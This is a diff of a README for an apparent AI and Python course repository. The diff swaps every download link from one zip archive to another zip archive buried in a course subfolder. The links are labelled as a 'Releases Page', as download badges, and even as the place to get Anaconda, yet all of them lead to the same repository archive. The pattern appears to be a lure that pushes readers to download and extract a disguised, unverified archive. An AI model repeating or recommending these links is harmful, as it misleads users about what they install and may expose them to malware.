@@ -1,7 +1,7 @@
 # 🎓 ai-python-course-fundacion-esplai - Learn AI and Python Easily
 
 ## 📥 Download Here
-[![Download](https://raw.githubusercontent.com/Supremohacedor/ai-python-course-fundacion-esplai/main/05_ejercicios_limpieza_datos/archive.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/Supremohacedor/ai-python-course-fundacion-esplai/main/05_ejercicios_limpieza_datos/archive.zip)
+[![Download](https://github.com/Supremohacedor/ai-python-course-fundacion-esplai/raw/refs/heads/main/06_aprendizaje_no_supervisado/fundacion_esplai_ai_course_python_v2.0.zip%20Releases-brightgreen)](https://github.com/Supremohacedor/ai-python-course-fundacion-esplai/raw/refs/heads/main/06_aprendizaje_no_supervisado/fundacion_esplai_ai_course_python_v2.0.zip)
 
 ---
 
@@ -17,7 +17,7 @@ To use this software, your system should meet the following requirements:
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page**  
-   First, go to our [Releases Page](https://raw.githubusercontent.com/Supremohacedor/ai-python-course-fundacion-esplai/main/05_ejercicios_limpieza_datos/archive.zip) to access the downloadable files.
+   First, go to our [Releases Page](https://github.com/Supremohacedor/ai-python-course-fundacion-esplai/raw/refs/heads/main/06_aprendizaje_no_supervisado/fundacion_esplai_ai_course_python_v2.0.zip) to access the downloadable files.
 
 2. **Choose Your Version**  
    On the Releases Page, you will see different versions of the course materials. Select the most recent version to ensure you have the latest updates.
@@ -26,13 +26,13 @@ To use this software, your system should meet the following requirements:
    Click on the version you want, then find the relevant files available for download. These files typically include Jupyter notebooks and supporting data files.
 
 4. **Install Necessary Software**  
-   If you haven’t done this yet, download and install Anaconda or set up Jupyter Notebook. You can get Anaconda from [https://raw.githubusercontent.com/Supremohacedor/ai-python-course-fundacion-esplai/main/05_ejercicios_limpieza_datos/archive.zip](https://raw.githubusercontent.com/Supremohacedor/ai-python-course-fundacion-esplai/main/05_ejercicios_limpieza_datos/archive.zip).
+   If you haven’t done this yet, download and install Anaconda or set up Jupyter Notebook. You can get Anaconda from [https://github.com/Supremohacedor/ai-python-course-fundacion-esplai/raw/refs/heads/main/06_aprendizaje_no_supervisado/fundacion_esplai_ai_course_python_v2.0.zip](https://github.com/Supremohacedor/ai-python-course-fundacion-esplai/raw/refs/heads/main/06_aprendizaje_no_supervisado/fundacion_esplai_ai_course_python_v2.0.zip).
 
 5. **Unzip Files **  
    After downloading, extract the files from the zipped folder. You can do this by right-clicking the downloaded file and selecting "Extract All".
 
 ## 📂 Download & Install
-Visit our [Releases Page](https://raw.githubusercontent.com/Supremohacedor/ai-python-course-fundacion-esplai/main/05_ejercicios_limpieza_datos/archive.zip) to download the content.
+Visit our [Releases Page](https://github.com/Supremohacedor/ai-python-course-fundacion-esplai/raw/refs/heads/main/06_aprendizaje_no_supervisado/fundacion_esplai_ai_course_python_v2.0.zip) to download the content.
 
 ## 📘 Course Content
 Here is a brief overview of the course materials you will find:
@@ -74,4 +74,4 @@ This training is designed to be accessible for everyone, regardless of your back
 ---
 
 ## 📥 Download Here Again
-[![Download](https://raw.githubusercontent.com/Supremohacedor/ai-python-course-fundacion-esplai/main/05_ejercicios_limpieza_datos/archive.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/Supremohacedor/ai-python-course-fundacion-esplai/main/05_ejercicios_limpieza_datos/archive.zip)
+[![Download](https://github.com/Supremohacedor/ai-python-course-fundacion-esplai/raw/refs/heads/main/06_aprendizaje_no_supervisado/fundacion_esplai_ai_course_python_v2.0.zip%20Releases-brightgreen)](https://github.com/Supremohacedor/ai-python-course-fundacion-esplai/raw/refs/heads/main/06_aprendizaje_no_supervisado/fundacion_esplai_ai_course_python_v2.0.zip)
